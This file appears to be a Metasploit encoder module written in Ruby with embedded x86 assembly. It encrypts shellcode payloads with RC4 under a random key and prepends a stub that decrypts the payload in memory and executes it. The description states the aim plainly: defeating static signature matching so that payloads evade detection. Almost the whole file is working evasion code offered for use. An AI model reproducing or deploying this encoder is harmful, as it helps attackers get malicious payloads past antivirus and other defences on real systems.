##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasm'
require 'rex/crypto/rc4'

class MetasploitModule < Msf::Encoder
  Rank = NormalRanking

  # Key padded to this width for S-box initialization simplicity.
  # Effective key material is KEY_LEN random bytes; remainder is zeroed.
  KEY_LEN = 16

  def initialize
    super(
      'Name'        => 'x86 RC4 Stream Cipher Encoder',
      'Description' => %q{
        Encodes x86 payloads with RC4 using a per-run random key.
        The encrypted payload has near-uniform byte distribution,
        defeating static signature matching.  The decoder stub is
        assembled in-place and decrypts the payload in the shellcode
        buffer before executing it (requires RWX memory, same
        assumption as shikata_ga_nai).

        Note: the stub may contain null bytes due to the div and
        sub-esp encoding.  Chain with another encoder (e.g.
        x86/shikata_ga_nai) to remove them when required.
      },
      'Author'      => 'msf',
      'Arch'        => ARCH_X86,
      'License'     => MSF_LICENSE,
      'EncoderType' => Msf::Encoder::Type::Raw,
      'Decoder'     => { 'KeySize' => KEY_LEN, 'KeyPack' => 'a*' }
    )
  end

  def encode(buf, _badchars = nil, _state = nil, _platform = nil)
    key       = Rex::Text.rand_text(KEY_LEN)
    encrypted = Rex::Crypto::Rc4.rc4(key, buf)
    stub      = build_stub(key, buf.length)
    stub + key + encrypted
  end

  private

  # Assemble the RC4 decoder stub.
  #
  # Data layout appended after the stub (at the address returned by call):
  #   [KEY_LEN bytes] key
  #   [payload_len bytes] RC4(payload)  ← decrypted in-place
  #
  def build_stub(key, payload_len)
    _ = key # reserved for future per-key stub variation
    asm = <<~ASM
      _start:
          jmp _get_data_addr

      _got_data_addr:
          pop ebp

          sub esp, 256
          mov edi, esp

          xor ecx, ecx
      _init_sbox:
          mov byte [edi+ecx], cl
          inc cl
          jnz _init_sbox

          xor esi, esi
          xor ebx, ebx

      _ksa_loop:
          movzx eax, byte [edi+esi]
          add ebx, eax

          mov eax, esi
          xor edx, edx
          push ebx
          mov ecx, #{KEY_LEN}
          div ecx
          pop ebx
          movzx eax, byte [ebp+edx]
          add ebx, eax
          and ebx, 0xff

          movzx eax, byte [edi+esi]
          movzx ecx, byte [edi+ebx]
          mov byte [edi+esi], cl
          mov byte [edi+ebx], al

          inc esi
          cmp esi, 256
          jb _ksa_loop

          xor esi, esi
          xor ebx, ebx
          xor ecx, ecx

      _prga_loop:
          inc esi
          and esi, 0xff

          movzx eax, byte [edi+esi]
          add ebx, eax
          and ebx, 0xff

          movzx eax, byte [edi+esi]
          movzx edx, byte [edi+ebx]
          mov byte [edi+esi], dl
          mov byte [edi+ebx], al

          add eax, edx
          and eax, 0xff
          movzx eax, byte [edi+eax]

          push ebx
          lea edx, [ebp+#{KEY_LEN}]
          xor al, byte [edx+ecx]
          mov byte [edx+ecx], al
          pop ebx

          inc ecx
          cmp ecx, #{payload_len}
          jb _prga_loop

          add esp, 256
          lea eax, [ebp+#{KEY_LEN}]
          jmp eax

      _get_data_addr:
          call _got_data_addr
    ASM

    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
  end
end
